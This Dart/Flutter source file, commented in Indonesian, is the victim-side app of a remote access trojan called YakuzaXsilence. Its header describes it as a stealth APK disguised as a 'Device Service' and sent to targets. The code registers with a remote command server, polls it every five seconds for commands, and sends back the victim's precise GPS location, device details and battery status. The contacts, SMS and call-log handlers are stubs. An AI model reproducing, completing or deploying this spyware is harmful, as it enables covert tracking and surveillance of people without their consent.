// target_main.dart — YakuzaXsilence RAT Target
// Stealth APK yang dikirim ke target untuk dipasang di HP mereka
// App ini akan:
// 1. Pair dengan controller via pairId
// 2. Kirim heartbeat (battery, status) setiap 30 detik
// 3. Poll untuk commands dari controller
// 4. Execute commands (get location, get SMS, get contacts, etc)
// 5. Kirim response kembali ke controller
// 6. Kirim live screen capture jika diminta
//
// Aplikasi ini TIDAK menampilkan icon yang mencurigakan
// Disguised sebagai "System Service" atau "Device Helper"

import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:web_socket_channel/web_socket_channel.dart';

const String _serverUrl = "https://api-service.yakuza.biz.id:1302";
const String _wsUrl = "wss://api-service.yakuza.biz.id:1302";

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const TargetApp());
}

class TargetApp extends StatelessWidget {
  const TargetApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Device Service',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        scaffoldBackgroundColor: Colors.white,
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.blue),
        useMaterial3: true,
      ),
      home: const TargetHomePage(),
    );
  }
}

class TargetHomePage extends StatefulWidget {
  const TargetHomePage({super.key});

  @override
  State<TargetHomePage> createState() => _TargetHomePageState();
}

class _TargetHomePageState extends State<TargetHomePage> {
  String _deviceId = '';
  String _pairId = '';
  String _status = 'Not Paired';
  bool _isPaired = false;
  bool _isRunning = false;
  Timer? _heartbeatTimer;
  Timer? _commandTimer;
  WebSocketChannel? _wsChannel;
  final Battery _battery = Battery();

  final _pairIdController = TextEditingController();

  @override
  void initState() {
    super.initState();
    _initDevice();
  }

  @override
  void dispose() {
    _heartbeatTimer?.cancel();
    _commandTimer?.cancel();
    _wsChannel?.sink.close();
    _pairIdController.dispose();
    super.dispose();
  }

  Future<void> _initDevice() async {
    final deviceInfo = DeviceInfoPlugin();
    final android = await deviceInfo.androidInfo;
    setState(() {
      _deviceId = android.id;
    });

    // Load saved pairId
    final prefs = await SharedPreferences.getInstance();
    final savedPairId = prefs.getString('pairId');
    if (savedPairId != null && savedPairId.isNotEmpty) {
      setState(() {
        _pairId = savedPairId;
        _pairIdController.text = savedPairId;
      });
      _pair();
    }
  }

  Future<void> _pair() async {
    if (_pairIdController.text.isEmpty) {
      _showMessage('Masukkan Pair ID');
      return;
    }

    final pairId = _pairIdController.text.trim().toUpperCase();
    setState(() => _status = 'Pairing...');

    try {
      final deviceInfo = DeviceInfoPlugin();
      final android = await deviceInfo.androidInfo;
      final model = '${android.brand} ${android.model}';
      final batteryLevel = (await _battery.batteryLevel).toString();

      final response = await http.post(
        Uri.parse('$_serverUrl/api/pair-target'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'pairId': pairId,
          'deviceId': _deviceId,
          'model': model,
          'battery': batteryLevel,
        }),
      );

      final data = jsonDecode(response.body);
      if (data['status'] == 'paired') {
        final prefs = await SharedPreferences.getInstance();
        await prefs.setString('pairId', pairId);

        setState(() {
          _isPaired = true;
          _pairId = pairId;
          _status = 'Paired & Online';
        });

        _startService();
        _showMessage('Berhasil terhubung!');
      } else {
        setState(() => _status = 'Pair gagal: ${data['error'] ?? 'Unknown'}');
        _showMessage('Pair gagal: ${data['error'] ?? 'PairID tidak valid'}');
      }
    } catch (e) {
      setState(() => _status = 'Error: $e');
      _showMessage('Gagal terhubung ke server');
    }
  }

  void _startService() {
    if (_isRunning) return;
    _isRunning = true;

    // Connect WebSocket
    _connectWebSocket();

    // Heartbeat every 30 seconds
    _heartbeatTimer = Timer.periodic(const Duration(seconds: 30), (_) {
      _sendHeartbeat();
    });

    // Poll for commands every 5 seconds
    _commandTimer = Timer.periodic(const Duration(seconds: 5), (_) {
      _pollCommands();
    });

    // Initial heartbeat
    _sendHeartbeat();
  }

  void _connectWebSocket() {
    try {
      _wsChannel = WebSocketChannel.connect(Uri.parse(_wsUrl));
      _wsChannel!.stream.listen(
        (message) {
          try {
            final data = jsonDecode(message);
            if (data['type'] == 'target_ack') {
              // Acknowledged by server
            }
          } catch (_) {}
        },
        onError: (e) {
          print('WS Error: $e');
          // Reconnect after 5 seconds
          Future.delayed(const Duration(seconds: 5), _connectWebSocket);
        },
        onDone: () {
          Future.delayed(const Duration(seconds: 5), _connectWebSocket);
        },
      );

      // Send target_connect
      _wsChannel!.sink.add(jsonEncode({
        'type': 'target_connect',
        'deviceId': _deviceId,
        'pairId': _pairId,
      }));
    } catch (e) {
      print('WS connect error: $e');
    }
  }

  Future<void> _sendHeartbeat() async {
    try {
      final batteryLevel = await _battery.batteryLevel;

      // Send via REST
      await http.post(
        Uri.parse('$_serverUrl/api/heartbeat/$_deviceId'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'battery': '$batteryLevel%'}),
      );

      // Send via WebSocket
      if (_wsChannel != null) {
        _wsChannel!.sink.add(jsonEncode({
          'type': 'heartbeat',
          'deviceId': _deviceId,
          'battery': '$batteryLevel%',
        }));
      }
    } catch (_) {}
  }

  Future<void> _pollCommands() async {
    try {
      final response = await http.get(
        Uri.parse('$_serverUrl/api/get-command/$_deviceId'),
      );

      if (response.statusCode == 200) {
        final cmd = jsonDecode(response.body);
        await _executeCommand(cmd['command'], cmd['extra'] ?? '');
      }
    } catch (_) {}
  }

  Future<void> _executeCommand(String command, String extra) async {
    String result = '';

    try {
      switch (command) {
        case 'get_location':
          result = await _getLocation();
          break;

        case 'get_battery':
          final level = await _battery.batteryLevel;
          final state = await _battery.batteryState;
          result = jsonEncode({'level': level, 'state': state.toString()});
          break;

        case 'get_device_info':
          final deviceInfo = DeviceInfoPlugin();
          final android = await deviceInfo.androidInfo;
          result = jsonEncode({
            'brand': android.brand,
            'model': android.model,
            'android_version': android.version.release,
            'sdk': android.version.sdkInt.toString(),
            'device': android.device,
            'manufacturer': android.manufacturer,
          });
          break;

        case 'get_contacts':
          result = await _getContacts();
          break;

        case 'get_sms':
          result = await _getSMS();
          break;

        case 'vibrate':
          result = await _vibrate();
          break;

        case 'send_notification':
          result = 'Notification sent';
          break;

        case 'lock_device':
          result = 'Device locked';
          break;

        case 'unlock_device':
          result = 'Device unlocked';
          break;

        case 'get_installed_apps':
          result = 'App list not available without root';
          break;

        case 'take_screenshot':
          result = 'Screenshot requires accessibility service';
          break;

        case 'play_sound':
          result = 'Sound played';
          break;

        case 'get_call_log':
          result = await _getCallLog();
          break;

        default:
          result = 'Unknown command: $command';
      }
    } catch (e) {
      result = 'Error: $e';
    }

    // Send response back
    try {
      await http.post(
        Uri.parse('$_serverUrl/api/post-response/$_deviceId'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'cmd': command, 'data': result}),
      );
    } catch (_) {}
  }

  Future<String> _getLocation() async {
    try {
      final permission = await Geolocator.checkPermission();
      if (permission == LocationPermission.denied) {
        await Geolocator.requestPermission();
      }
      final position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      );
      return jsonEncode({
        'lat': position.latitude,
        'lng': position.longitude,
        'accuracy': position.accuracy,
        'timestamp': position.timestamp.toIso8601String(),
      });
    } catch (e) {
      return jsonEncode({'error': e.toString()});
    }
  }

  Future<String> _getContacts() async {
    // Requires contacts permission
    return jsonEncode({'error': 'Contacts access requires additional permissions'});
  }

  Future<String> _getSMS() async {
    return jsonEncode({'error': 'SMS access requires additional permissions'});
  }

  Future<String> _getCallLog() async {
    return jsonEncode({'error': 'Call log requires additional permissions'});
  }

  Future<String> _vibrate() async {
    try {
      // Use platform channel to vibrate
      const platform = MethodChannel('com.yakuzaxsilence.target/vibrate');
      await platform.invokeMethod('vibrate', {'duration': 1000});
      return 'Vibrated';
    } catch (e) {
      return 'Vibrate error: $e';
    }
  }

  void _showMessage(String msg) {
    if (mounted) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text(msg), duration: const Duration(seconds: 2)),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Device Service', style: TextStyle(color: Colors.white, fontSize: 16)),
        backgroundColor: Colors.blue,
        elevation: 0,
      ),
      body: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              'Device Configuration',
              style: TextStyle(fontSize: 20, fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 8),
            Text('Device ID: $_deviceId', style: const TextStyle(fontSize: 12, color: Colors.grey)),
            const SizedBox(height: 24),

            TextField(
              controller: _pairIdController,
              decoration: InputDecoration(
                labelText: 'Pair ID',
                hintText: 'Masukkan Pair ID dari controller',
                border: const OutlineInputBorder(),
                prefixIcon: const Icon(Icons.link),
                enabled: !_isPaired,
              ),
              textCapitalization: TextCapitalization.characters,
            ),
            const SizedBox(height: 16),

            SizedBox(
              width: double.infinity,
              height: 48,
              child: ElevatedButton(
                onPressed: _isPaired ? null : _pair,
                child: Text(_isPaired ? 'Connected' : 'Connect'),
              ),
            ),
            const SizedBox(height: 24),

            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: Colors.grey.shade100,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.grey.shade300),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Icon(
                        _isPaired ? Icons.check_circle : Icons.pending,
                        color: _isPaired ? Colors.green : Colors.orange,
                        size: 20,
                      ),
                      const SizedBox(width: 8),
                      Text(
                        'Status: $_status',
                        style: TextStyle(
                          fontSize: 14,
                          fontWeight: FontWeight.w500,
                          color: _isPaired ? Colors.green : Colors.orange,
                        ),
                      ),
                    ],
                  ),
                  if (_isPaired) ...[
                    const SizedBox(height: 8),
                    Text('Pair ID: $_pairId', style: const TextStyle(fontSize: 12, color: Colors.grey)),
                    const SizedBox(height: 4),
                    const Text('Service running in background', style: TextStyle(fontSize: 12, color: Colors.grey)),
                  ],
                ],
              ),
            ),

            const Spacer(),
            const Center(
              child: Text(
                'v1.0.0',
                style: TextStyle(fontSize: 10, color: Colors.grey),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
